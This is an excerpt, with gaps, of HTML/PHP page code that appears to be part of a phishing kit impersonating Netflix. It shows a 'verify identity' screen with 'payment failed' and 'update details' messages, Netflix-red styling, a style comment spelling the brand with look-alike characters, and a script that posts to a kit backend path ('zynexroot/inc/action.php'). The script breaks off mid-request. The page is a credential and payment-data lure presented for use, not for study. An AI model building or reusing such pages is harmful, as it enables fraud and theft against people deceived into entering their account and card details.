...
<style>
    .regFormContainer {
        background-color: #ffffff; /* White container for clean design */
    ...
    .regFormContainer img {
        width: 96px; /* Optimized image size */
		height: 96px;
        margin-bottom: 20px;
    }
    ...
    .small-button {
        ...
        border: none;
        border-radius: 8px;
        background-color: #e50914; /*Nеtflіх red */
        color: #ffffff;
        cursor: pointer;
    ...
    .small-button:hover {
        background-color: #bf0810; /* Slightly darker red for hover effect */
        box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2); /* Add hover shadow */
    }
</style>

<div class="regFormContainer">
    <img src="image/sec.png" alt="Security Shield">
	<div data-layout="stackItem" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zp0: auto; --zc08zpg: 0 auto; --zc08zp7: 0px;">
<h1 class="default-ltr-cache-1lbodd9 euy28770">
    <?php echo $translations['verifyIdentity']; ?>
</h1></div>
<div class="contextBody"><?php echo $translations['paymentFailed']; ?></div>
<div class="contextBody"><?php echo $translations['updateDetails']; ?></div>
<input type="hidden" id="startverify" name="startverify" value="Pushed" />

<button class="small-button" onclick="submit_form()" type="button" id="submit_button">
    <?php echo $translations['nextButton']; ?>
</button>
...
<script>
  function submit_form() {
    ...
    const startverify = document.getElementById('startverify').value;

    // Prepare the data
    const data = new URLSearchParams({ startverify });

    // Send the POST request
    fetch('zynexroot/inc/action.php?type=startverify', {
      method: 'POST',
      headers: {
